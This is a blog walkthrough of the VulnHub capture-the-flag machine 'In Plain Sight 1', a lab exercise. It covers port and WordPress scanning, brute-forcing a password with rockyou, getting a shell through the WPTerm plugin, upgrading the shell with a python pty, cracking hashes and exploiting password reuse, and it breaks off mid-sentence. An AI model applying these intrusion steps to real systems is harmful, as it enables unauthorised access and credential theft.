---
layout: post
cover: 'assets/images/cover3.jpg'
navigation: True
title: In Plain Sight 1 - CTF
date: 2019-12-04 22:00:00
tags: CTF
subclass: 'post'
logo: 'assets/images/0x47.png'
author: "0x47"
twitter: "0x47"
categories: "CTF"
---

<p>In plain sight 1 is a CTF I found on <a href="https://www.vulnhub.com/entry/in-plain-sight-1,400/">Vuln Hub</a>, created by <a href="https://twitter.com/@bzyo_">byzo_</a>. Rated as beginner - intermediate.</p>

<h2>Discovery</h2>
{% highlight sh %}
% sudo nmap -sS -O 192.168.1.0/24
Password:
Starting Nmap 7.70 ( https://nmap.org ) at 2019-12-04 22:37 GMT
....
Nmap scan report for 192.168.1.167
Host is up (0.011s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:AD:1D:84 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=12/4%OT=21%CT=1%CU=30693%PV=Y%DS=1%DC=D%G=Y%M=080027%T
OS:M=5DE83573%P=x86_64-apple-darwin18.0.0)SEQ(SP=FF%GCD=1%ISR=109%TI=Z%CI=Z
OS:%II=I%TS=A)SEQ(SP=FF%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(CI=Z%II=I)OPS(O1=M
OS:5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%
OS:O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%
OS:DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
....
{% endhighlight %}


<h2>Enumeration</h2>
Did a full nmap scan to see if there are any more open ports than those highlighted above.
{% highlight sh %}
nmap -A -T4 -p- 192.168.1.167
Starting Nmap 7.70 ( https://nmap.org ) at 2019-12-04 22:46 GMT
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 22:46 (0:00:06 remaining)
Nmap scan report for 192.168.1.167
Host is up (0.00048s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           306 Nov 22 13:42 todo.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.1.181
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 39:2d:36:30:aa:ac:5d:16:01:08:2c:5f:c5:67:17:b4 (RSA)
|   256 b0:21:a7:43:0c:92:85:70:ff:57:c6:f9:37:df:e5:a2 (ECDSA)
|_  256 73:99:d5:82:87:8c:0a:bc:3d:1e:8d:aa:b1:69:aa:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.28 seconds
{% endhighlight %}

Couple of instantly noteworthy things here:-
* Anonymous FTP with write permissions and file we can read.
* vsFTP 3.0.3, which I'm fairly sure has a security exploit.
* Apache running on port 80.

<h2>Reconnaissance</h2>
<p>A quick look at the file in the ftp folder shows the following text.</p>
<blockquote>
<p>mike - please get ride of that worthless wordpress instance! it's a security ris
k.  if you have privilege issues, please ask joe for assitance.</p>

<p>joe - stop leaving backdoors on the system or your access will be removed! y
our rabiit holes aren't enough for these elite cyber hacking types.</p>

<p>- boss person</p>
</blockquote>

<p>Normally I'd run dirb nowish, but I'm fairly sure I'll find a wordpress instance on either /wordpress or /mike. Sure enough a quick look reveals one on on /wordpress.</p>
<p>All the references are for a base url of http://inplainsight/... so I added a host entry for ease.</p>

<p><img src="/assets/images/2019/12/inplainsight-wp.png" alt="WP Blog" /></p>

<p>Let's run wpscan:</p>
{% highlight sh %}
% wpscan http://inplainsight/wordpress
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________


[i] Please use '-u http://inplainsight/wordpress' next time
[+] URL: http://inplainsight/wordpress/
[+] Started: Wed Dec  4 23:07:51 2019

[+] Interesting header: LINK: <http://inplainsight/wordpress/index.php/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.41 (Ubuntu)
[+] XML-RPC Interface available under: http://inplainsight/wordpress/xmlrpc.php   [HTTP 405]
[+] Found an RSS Feed: http://inplainsight/wordpress/index.php/feed/   [HTTP 200]
[!] Detected 1 user from RSS feed:
+------------+
| Name       |
+------------+
| bossperson |
+------------+
[!] Upload directory has directory listing enabled: http://inplainsight/wordpress/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://inplainsight/wordpress/wp-includes/

[+] Enumerating WordPress version ...

[+] WordPress version 5.3 (Released on 2019-11-12) identified from meta generator, links opml

[+] WordPress theme in use: twentytwenty - v1.0

[+] Name: twentytwenty - v1.0
 |  Latest version: 1.0 (up to date)
 |  Last updated: 2019-11-12T00:00:00.000Z
 |  Location: http://inplainsight/wordpress/wp-content/themes/twentytwenty/
 |  Readme: http://inplainsight/wordpress/wp-content/themes/twentytwenty/readme.txt
 |  Style URL: http://inplainsight/wordpress/wp-content/themes/twentytwenty/style.css
 |  Theme Name: Twenty Twenty
 |  Theme URI: https://wordpress.org/themes/twentytwenty/
 |  Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block edi...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating plugins from passive detection ...
[+] No plugins found passively

[+] Finished: Wed Dec  4 23:07:53 2019
[+] Elapsed time: 00:00:02
[+] Requests made: 67
[+] Memory used: 63.293 MB
{% endhighlight %}

<p>This all looks pretty interesting, but no plugins found. A user called bossperson (further enumeration found no more users). Some directory listing enabled but nothing obviously out of the ordinary is visible in those directories.<p>

<p>After a *lot* of hunting around and re-reading all the typo's on the note I finally came across _/index.htnl_ file, which has a beautiful reference to Jurassic Park:</p>
<p><img src="/assets/images/2019/12/cg.gif" alt="Clever Girl" /></p>

<p>The gif links through to a page with in image upload form on it that seems to post to upload.php in a hidden path. First thing I attempted was to upload a php script, but initial error saying file is not an image was displayed.</p>

<p>Uploading a valid image displays the message "File is an image - image/png.". Looks like it's running the file name through file utility if it matches an image file name type. Can we inject here...</p>

<p>To try injecting, I began crafting an upload in curl...</p>
{% highlight sh %}
% curl -F fileToUpload=@0x47.png http://inplainsight/748AD6CCD32E4E52718445BB1CADC01EB08A0DF6/upload.php
...
<!--c28tZGV2LXdvcmRwcmVzcw==-->
{% endhighlight %}

{% highlight sh %}
% echo "c28tZGV2LXdvcmRwcmVzcw==" |base64 -d
so-dev-wordpress
{% endhighlight %}

<p>After first trying that as the password for the wp instance at /wordpress, I tried navigating to /so-dev-wordpress and found another instance.</p>

<p>WPScan reveals this has two users admin and mike. Directory listing on some folders, the same as the previous instance and uses the 2020 theme.</p>

<p>Brute forcing passwords with wpscan, using rockyou password list give us the following:</p>
{% highlight sh %}
+----+-------+------+----------+
| ID | Login | Name | Password |
+----+-------+------+----------+
|    | admin |      | admin1   |
+----+-------+------+----------+
{% endhighlight %}

<p>Login as admin and install the <a href="https://wordpress.org/plugins/wpterm/">WPTerm plugin</a>. Woop shell (ish), quick nc to open up an actual responsive shell.</p>

<p><img src="/assets/images/2019/12/nc-noe.png" alt="Netcat no -e" /></p>

<p>Upgrade the nc shell to in an interactive one using python trick.</p>
{% highlight sh %}
% python3 -c 'import pty; pty.spawn("/bin/bash")'
{% endhighlight %}

<p>Eventually I looked at the mysql databases for the Wordpress instances and found the password hashes for the users. The admin one we already know, but Mike's hash was a bit tricker. Cracked it using hashcat eventually, to give the password _skuxdelux_.</p>

<p>Thanks mike for using the same password for your login! So now I can su to mike.</p>

<p>Doh! Now I find the obvious clue....</p>

{% highlight sh %}
mike@inplainsight:/$ ls -la /var/mail/mike
ls -la /var/mail/mike
-rw-r--r-- 1 mike mail 580 Nov 22 06:51 /var/mail/mike
mike@inplainsight:/$ cat /var/mail/mike
cat /var/mail/mike
From joe@inplainsight  Fri Nov 22 06:51:55 2019
Return-Path: <joe@inplainsight>
X-Original-To: mike@inplainsight
Delivered-To: mike@inplainsight
Received: by inplainsight (Postfix, from userid 1001)
        id F40BF5AB4; Fri, 22 Nov 2019 06:51:54 -0500 (EST)
Subject: remember
To: <mike@inplainsight>
X-Mailer: mail (GNU Mailutils 3.6)
Message-Id: <20191122115154.F40BF5AB4@inplainsight>
Date: Fri, 22 Nov 2019 06:51:54 -0500 (EST)
From: hyphens rule <joe@inplainsight>

mike. remember before removing wordpress to update your password. i know you use the same password for both. - joe
{% endhighlight %}

<p>Looking at the apps with stickybits I can see that bwrap has, but can't be run by mike, so we might still need to get access to joe (or indeed any other user).</p>
{% highlight sh %}
mike@inplainsight:/var/log/journal$ ls -la /usr/bin/bwrap
-rwsr-sr-x+ 1 root root 16784 Jun 11 20:56 /usr/bin/bwrap

mike@inplainsight:/var/log/journal$ getfacl /usr/bin/bwrap
getfacl /usr/bin/bwrap
getfacl: Removing leading '/' from absolute path names
# file: usr/bin/bwrap
# owner: root
# group: root
# flags: ss-
user::rwx
user:www-data:---
user:mike:---
group::r-x
mask::r-x
other::r-x
{% endhighlight %}

<p>So... I spent hours and hours looking for a privilege escalation from www-data user. So I could eventually try to read the journal file in Joe's home directory. Turns out, I'm a complete idiot.... the name was a clue. /var/log/journal/ contains a file directory called 0e210a0b82a244528d7afee021eb5514.</p>

<p>The folder has sticky bit enabled
